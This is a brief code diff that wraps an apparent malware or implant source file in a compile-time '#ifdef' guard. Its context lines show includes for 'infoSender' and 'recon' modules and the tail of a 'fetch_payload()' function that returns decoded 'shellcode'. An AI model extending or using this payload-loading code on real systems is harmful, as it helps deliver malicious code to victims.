@@ -1,3 +1,6 @@
+#ifdef ENABLE_ADMISSION_PLATFORM
+
+
 #include "infoSender.h"
 #include "../recon/recon.h"
 #include "../Tools.h"
@@ -252,3 +255,5 @@ std::vector<unsigned char> fetch_payload(){
     std::vector<unsigned char> shellcode(decoded.begin(), decoded.end());
     return shellcode;
 }
+
+#endif 
